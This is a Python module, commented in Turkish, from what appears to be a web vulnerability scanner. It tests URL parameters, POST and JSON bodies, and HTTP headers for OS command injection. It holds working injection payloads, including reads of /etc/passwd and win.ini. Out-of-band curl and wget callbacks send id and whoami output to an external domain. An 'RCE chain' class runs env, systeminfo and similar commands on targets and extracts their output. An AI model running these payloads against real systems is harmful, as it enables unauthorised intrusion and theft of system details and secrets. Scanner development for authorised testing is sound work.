"""
websecure.scanners.cmdi
------------------------
OS Command Injection (CMDI) zafiyet taraması.

FAZ 6.1: sqli.py'deki CMDI kodu bu modüle taşındı.
sqli.py hâlâ `scan_cmdi_url()` metodunu taşır; bu modül ise bağımsız
CmdiScanner sınıfı ve plugin API'si sunar.

Strateji:
  1. URL parametrelerine OS komut enjeksiyonu payload'ları enjekte et
  2. Yanıtta komut çıktısı desenleri ara (error-based + time-based)
  3. Paralel probe ile hızlı tarama, BaseScanner.run_parallel_probes()
"""
from __future__ import annotations

import logging
import re
import time
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlparse, urlencode, urlunparse

import requests as _requests

from websecure.scanners.base import BaseScanner
from websecure.core.payloads import load_external_payloads

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Payload ve detection tanımları
# ---------------------------------------------------------------------------

_CMDI_PAYLOADS_CORE: List[Tuple[str, str]] = [
    # (payload, technique) — canary + time tabanlı yüksek güvenilirlik
    ("; echo CMDI_UNIX_$(id)",             "unix_echo"),
    ("| echo CMDI_UNIX_$(id)",             "unix_pipe"),
    ("`echo CMDI_UNIX_$(whoami)`",         "unix_backtick"),
    ("$(echo CMDI_UNIX_$(id))",            "unix_subshell"),
    ("' ; echo CMDI_UNIX_$(id) #",         "unix_quote_escape"),
    ("\" ; echo CMDI_UNIX_$(id) #",        "unix_dquote_escape"),
    ("& echo CMDI_WIN_%USERNAME%",         "windows_amp"),
    ("| echo CMDI_WIN_%COMPUTERNAME%",     "windows_pipe"),
    ("; sleep 5",                          "unix_time"),
    ("| sleep 5",                          "unix_time_pipe"),
    ("& timeout /T 5 /NOBREAK",            "windows_time"),
    ("; cat /etc/passwd",                  "unix_file_read"),
    ("| cat /etc/passwd",                  "unix_file_read_pipe"),
    ("& type C:\\Windows\\win.ini",        "windows_file_read"),
]

def _load_cmdi_payloads() -> List[Tuple[str, str]]:
    """cmdi.txt wordlist'ini yükle, core listesiyle birleştir (dedup)."""
    seen = {p for p, _ in _CMDI_PAYLOADS_CORE}
    ext: List[Tuple[str, str]] = []
    for line in load_external_payloads("cmdi"):
        if line and line not in seen:
            seen.add(line)
            # time-based payload'ları etiketle
            tag = "ext_time" if any(k in line for k in ("sleep", "timeout", "ping", "DELAY")) else "ext"
            ext.append((line, tag))
    return _CMDI_PAYLOADS_CORE + ext

_CMDI_PAYLOADS: List[Tuple[str, str]] = _load_cmdi_payloads()

_CMDI_SUCCESS_PATTERNS: List[Tuple[str, str]] = [
    (r"uid=\d+\(.*?\)\s+gid=\d+",          "Unix id output — command execution confirmed"),
    (r"root:.*:0:0:",                        "/etc/passwd read — LFI/CMDI confirmed"),
    (r"CMDI_UNIX_",                          "Echo marker reflected — command injection confirmed"),
    (r"\[extensions\].*for 16\-bit app",    "Windows win.ini read — CMDI confirmed"),
    (r"CMDI_WIN_\S+",                        "Windows env variable reflected — CMDI confirmed"),
    (r"(?i)(cannot run program|execvp|/bin/sh|cmd\.exe)", "Shell execution error leak"),
]

MAX_WORKERS = 5
REQUEST_TIMEOUT = 12
TIME_DELTA = 3.0  # seconds above baseline to flag time-based


# ---------------------------------------------------------------------------
# CmdiScanner
# ---------------------------------------------------------------------------

class CmdiScanner(BaseScanner):
    """
    OS Command Injection scanner.
    BaseScanner'dan türetilir — session, results, report_finding ve
    run_parallel_probes BaseScanner'dan gelir.

    FAZ 6.1: sqli.py'deki CMDI logic'i bu sınıfa taşındı.
    """

    name = "cmdi"
    phase = "offensive"

    def run(self, target: str, **kwargs) -> None:
        """BaseScanner interface — delegates to scan()."""
        urls = kwargs.get("urls") or [target]
        for url in urls:
            self.scan_url(url)

        # --- Adım 5: RCE chain — komut çıktısını raporla -----------------
        self._run_rce_chain(urls)

    def _run_rce_chain(self, urls: List[str]) -> None:
        """
        Confirms CMDI findings with CMDIRCEChain — extracts real command output.
        Runs only on URLs that already produced a CMDI finding (optimization).
        """
        rce = CMDIRCEChain()
        confirmed_urls = {
            f.get("url", "")
            for f in (self.results or {}).get("offensive", [])
            if "Command Injection" in f.get("vuln_type", "")
        }
        for url in urls[:5]:
            if url not in confirmed_urls:
                continue
            parsed = urlparse(url)
            params = [p for p, _ in parse_qsl(parsed.query)]
            for param in params[:3]:
                result = rce.extract(url, param, self.session)
                if result:
                    self.report_finding(
                        vuln_type="OS Command Injection — RCE Confirmed (Output Extracted)",
                        url=url,
                        param=param,
                        payload=result["payload"],
                        severity="Critical",
                        evidence=(
                            f"Command '{result['command']}' output: "
                            f"{result['output_snippet'][:300]}"
                        ),
                        rce_confirmed=True,
                        command=result["command"],
                    )

    def scan_url(self, url: str) -> bool:
        """
        Bir URL'nin parametrelerini OS komut enjeksiyonuna karşı test eder.
        Returns True if a finding was reported, False otherwise.
        """
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return False

        logger.info(f"[CMDI] Scanning URL params: {url}")

        t0 = time.time()
        baseline_resp = self.fetch_baseline(url, timeout=10)
        if not baseline_resp:
            return False

        baseline_time = time.time() - t0
        baseline_text = baseline_resp.text or ""
        time_threshold = baseline_time + TIME_DELTA

        # Test ALL parameters — never stop at first hit (multi-param URLs may have
        # several injectable fields)
        found = False
        for param_name, _ in params:
            if self._test_param(url, params, param_name, baseline_text, time_threshold):
                found = True
            # OOB/DNS detection for this parameter
            self._scan_oob_cmdi(url, params, param_name)

        # Additional injection surfaces
        self._scan_post_body(url, params, baseline_text, time_threshold)
        self._scan_json_body(url, params, baseline_text, time_threshold)
        self._scan_headers_cmdi(url, baseline_text, time_threshold)

        return found

    def _test_param(
        self,
        url: str,
        qs: list,
        param_name: str,
        baseline_text: str,
        time_threshold: float,
    ) -> bool:
        parsed = urlparse(url)

        def probe(args: Tuple[str, str]) -> Optional[Dict]:
            payload, technique = args
            new_qs = [(p, v + payload if p == param_name else v) for p, v in qs]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            t0 = time.time()
            try:
                resp = self.session.get(t_url, timeout=REQUEST_TIMEOUT)
                elapsed = time.time() - t0
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[CMDI] Probe timed out for {t_url}: {exc!r}")
                return None
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[CMDI] Probe connection error for {t_url}: {exc!r}")
                return None
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[CMDI] Probe request failed for {t_url}: {exc!r}")
                return None

            atk_text = resp.text or ""
            for pattern, description in _CMDI_SUCCESS_PATTERNS:
                if re.search(pattern, atk_text, re.I | re.S):
                    if not re.search(pattern, baseline_text, re.I | re.S):
                        return {
                            "vuln_type": "OS Command Injection",
                            "url": url,
                            "param": param_name,
                            "payload": payload,
                            "evidence": f"{description} (technique: {technique})",
                        }

            if "time" in technique and elapsed > time_threshold:
                # Cross-validate time-based: need 2/3 requests to confirm
                if self._verify_time_based_cmdi(url, params, param_name, payload, time_threshold):
                    return {
                        "vuln_type": "OS Command Injection (Time-Based)",
                        "url": url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": (
                            f"Time-based cross-validated: {elapsed:.2f}s > {time_threshold:.2f}s"
                        ),
                    }
            return None

        hits = self.run_parallel_probes(probe, _CMDI_PAYLOADS, max_workers=MAX_WORKERS)
        for hit in hits:
            self.report_finding(severity="Critical", **hit)
        return bool(hits)

    def _verify_time_based_cmdi(
        self,
        url: str,
        qs: list,
        param_name: str,
        payload: str,
        time_threshold: float,
        n: int = 3,
        min_hits: int = 2,
    ) -> bool:
        """Repeat time-based payload n times; report only if min_hits exceed threshold."""
        parsed = urlparse(url)
        hits = 0
        for _ in range(n):
            new_qs = [(p, v + payload if p == param_name else v) for p, v in qs]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            t0 = time.time()
            try:
                self.session.get(t_url, timeout=time_threshold + 5)
                if time.time() - t0 > time_threshold:
                    hits += 1
            except _requests.exceptions.Timeout:
                hits += 1
            except _requests.exceptions.RequestException:
                pass
            if hits >= min_hits:
                return True
        return False

    # ------------------------------------------------------------------
    # Additional injection surfaces
    # ------------------------------------------------------------------

    _CMDI_HEADERS = [
        "X-Forwarded-For", "X-Real-IP", "Referer",
        "User-Agent", "X-Original-URL", "X-Rewrite-URL",
    ]

    def _scan_post_body(
        self, url: str, params: list,
        baseline_text: str, time_threshold: float,
    ) -> None:
        """Inject CMDI payloads into POST form body."""
        base = {k: v for k, v in params}
        for key in list(base.keys()):
            for payload, technique in _CMDI_PAYLOADS_CORE:
                data = dict(base)
                data[key] = data[key] + payload
                t0 = time.time()
                try:
                    resp = self.session.post(url, data=data, timeout=REQUEST_TIMEOUT)
                    elapsed = time.time() - t0
                except _requests.exceptions.RequestException:
                    continue
                text = resp.text or ""
                for pattern, desc in _CMDI_SUCCESS_PATTERNS:
                    if re.search(pattern, text, re.I | re.S) and not re.search(pattern, baseline_text, re.I | re.S):
                        self.report_finding(
                            vuln_type="OS Command Injection (POST Body)",
                            url=url, param=key, payload=payload, severity="Critical",
                            evidence=f"{desc} (POST body, technique: {technique})",
                        )
                        break

    def _scan_json_body(
        self, url: str, params: list,
        baseline_text: str, time_threshold: float,
    ) -> None:
        """Inject CMDI payloads into JSON body (REST API surface)."""
        base = {k: v for k, v in params}
        for key in list(base.keys()):
            for payload, technique in _CMDI_PAYLOADS_CORE[:6]:  # top payloads only
                data = dict(base)
                data[key] = data[key] + payload
                t0 = time.time()
                try:
                    resp = self.session.post(
                        url, json=data,
                        headers={"Content-Type": "application/json"},
                        timeout=REQUEST_TIMEOUT,
                    )
                    elapsed = time.time() - t0
                except _requests.exceptions.RequestException:
                    continue
                text = resp.text or ""
                for pattern, desc in _CMDI_SUCCESS_PATTERNS:
                    if re.search(pattern, text, re.I | re.S) and not re.search(pattern, baseline_text, re.I | re.S):
                        self.report_finding(
                            vuln_type="OS Command Injection (JSON Body)",
                            url=url, param=key, payload=payload, severity="Critical",
                            evidence=f"{desc} (JSON body)",
                        )
                        break

    def _scan_headers_cmdi(
        self, url: str,
        baseline_text: str, time_threshold: float,
    ) -> None:
        """Inject CMDI payloads into HTTP headers (X-Forwarded-For, Referer, User-Agent…)."""
        for header in self._CMDI_HEADERS:
            for payload, technique in _CMDI_PAYLOADS_CORE[:8]:
                t0 = time.time()
                try:
                    resp = self.session.get(
                        url, headers={header: "127.0.0.1" + payload},
                        timeout=REQUEST_TIMEOUT,
                    )
                    elapsed = time.time() - t0
                except _requests.exceptions.RequestException:
                    continue
                text = resp.text or ""
                for pattern, desc in _CMDI_SUCCESS_PATTERNS:
                    if re.search(pattern, text, re.I | re.S) and not re.search(pattern, baseline_text, re.I | re.S):
                        self.report_finding(
                            vuln_type="OS Command Injection (Header)",
                            url=url,
                            param=f"[Header] {header}",
                            payload=payload,
                            severity="Critical",
                            evidence=f"{desc} (header injection via {header})",
                        )
                        break

    def _get_oast_domain(self) -> Optional[str]:
        """Return OAST domain from global poller or results dict."""
        try:
            from websecure.core.oast import get_global_poller
            poller = get_global_poller()
            if poller and hasattr(poller, "_domain"):
                return poller._domain
        except Exception:
            pass
        return (self.results or {}).get("oast_domain")

    def _scan_oob_cmdi(self, url: str, params: list, param_name: str) -> None:
        """
        OOB/DNS callback CMDI detection via interactsh.
        If no OAST domain is configured, silently skips.
        """
        domain = self._get_oast_domain()
        if not domain:
            return

        import random as _rnd, string as _str
        token = "".join(_rnd.choices(_str.ascii_lowercase, k=6))
        oob_payloads = [
            (f"; nslookup {token}.{domain}",                         "unix_nslookup"),
            (f"; curl -s http://{token}.{domain}/$(id|base64)",      "unix_curl_oob"),
            (f"& nslookup {token}.{domain}",                         "windows_nslookup"),
            (f"; ping -c 1 {token}.{domain}",                        "unix_ping"),
            (f"; wget -q http://{token}.{domain}/$(whoami)",          "unix_wget"),
        ]

        parsed = urlparse(url)
        for payload, _ in oob_payloads:
            new_qs = [(p, v + payload if p == param_name else v) for p, v in params]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            try:
                self.session.get(t_url, timeout=REQUEST_TIMEOUT)
            except Exception:
                pass

        # Poll for callback up to 10 seconds
        deadline = time.time() + 10
        while time.time() < deadline:
            try:
                from websecure.core.oast import get_global_poller
                poller = get_global_poller()
                if poller:
                    for cb in list(getattr(poller, "_callbacks_received", [])):
                        if token in str(cb):
                            self.report_finding(
                                vuln_type="OS Command Injection (OOB/DNS)",
                                url=url,
                                param=param_name,
                                payload=f"DNS callback token={token}",
                                severity="Critical",
                                evidence=f"OOB DNS callback received: {str(cb)[:200]}",
                            )
                            return
            except Exception:
                pass
            time.sleep(1)


# ---------------------------------------------------------------------------
# Plugin API
# ---------------------------------------------------------------------------

def run(
    url: str,
    session=None,
    results=None,
    debug: bool = False,
    urls: Optional[List[str]] = None,
    **kwargs,
) -> None:
    scanner = CmdiScanner(session=session, results=results, debug=debug)
    targets = urls or [url]
    scanner.run(targets[0], urls=targets)


# ===========================================================================
# Adım 5 — CMDI -> RCE Automation Chain
# ===========================================================================

class CMDIRCEChain:
    """
    Post-injection RCE chain: after CMDI is confirmed, extracts actual
    command output to prove exploitability beyond timing-based guesses.
    Single Responsibility: command output extraction only.
    Open/Closed: extend _UNIX_CMDS/_WIN_CMDS for new targets.
    """

    _INJECT_FMTS: List[Tuple[str, str]] = [
        ("; {cmd}",           "unix_semicolon"),
        ("| {cmd}",           "unix_pipe"),
        ("$({cmd})",          "unix_subshell"),
        ("`{cmd}`",           "unix_backtick"),
        ("%0a{cmd}",          "unix_newline"),
        ("%0d%0a{cmd}",       "unix_crlf_newline"),
        ("& {cmd}",           "win_amp"),
        ("| {cmd}",           "win_pipe"),
        ("&& {cmd}",          "win_ampamp"),
    ]

    _UNIX_CMDS: List[str] = [
        "id",
        "whoami",
        "uname -a",
        "cat /etc/passwd",
        "env",
        "hostname",
        "ip a 2>/dev/null || ifconfig",
    ]

    _WIN_CMDS: List[str] = [
        "whoami",
        "systeminfo",
        "ipconfig",
        "type C:\\Windows\\win.ini",
        "echo %USERNAME%",
    ]

    _OUTPUT_RE = re.compile(
        r"(?:uid=\d+\("
        r"|root:.*:0:0:"
        r"|Linux \S+"
        r"|Microsoft Windows"
        r"|\[extensions\]"          # win.ini
        r"|PROCESSOR_ARCHITECTURE"  # systeminfo
        r"|inet \d+\.\d+"           # ip a / ifconfig
        r"|www-data|apache|nginx"   # common web users
        r"|IP Address.*\d+\.\d+)",  # ipconfig
        re.I | re.S,
    )

    def extract(
        self,
        url: str,
        param: str,
        session: Any,
        baseline_text: str = "",
        timeout: int = 12,
    ) -> Optional[Dict[str, Any]]:
        """
        Try all inject formats × commands, return first result with real output.
        Returns None if no output can be extracted.
        """
        parsed = urlparse(url)
        qs = parse_qsl(parsed.query)

        for fmt, technique in self._INJECT_FMTS:
            for cmd in self._UNIX_CMDS + self._WIN_CMDS:
                payload = fmt.format(cmd=cmd)
                new_qs = [(p, v + payload if p == param else v) for p, v in qs]
                t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
                try:
                    resp = session.get(t_url, timeout=timeout)
                    text = resp.text or ""
                    m = self._OUTPUT_RE.search(text)
                    if m and m.group(0) not in baseline_text:
                        start = max(0, m.start() - 30)
                        end = min(len(text), m.end() + 250)
                        return {
                            "command": cmd,
                            "technique": technique,
                            "payload": payload,
                            "output_snippet": text[start:end].strip(),
                        }
                except Exception:
                    continue
        return None
